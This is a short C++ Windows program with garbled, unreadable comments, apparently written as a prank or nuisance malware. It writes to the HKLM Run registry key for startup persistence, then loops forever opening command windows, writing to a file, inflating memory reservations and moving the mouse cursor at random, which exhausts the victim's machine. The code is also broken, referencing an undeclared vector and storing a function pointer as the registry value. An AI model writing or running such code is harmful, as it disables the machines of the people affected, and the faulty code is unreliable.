#include <iostream>
#include <vector>
#include <cstdlib>
#include <windows.h>
using namespace std;
vector<string> a;//���ڴ�
long long int cnt;
int main(){
  HKEY hKey;
  RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hKey );
  RegSetValueEx(hKey, "Writing to the Registry Example",0,REG_SZ,(const unsigned char*)system,sizeof(system));
  RegCloseKey(hKey);
	freopen("���ڴ�.in","w",stdout);
	while(true){
		system("start cmd");
		cout<<"���ڴ�";
		cnt+=1000000;
		vec.reserve(cnt);
		SetCursorPos(rand()%1000,rand()%1000);
	}
}
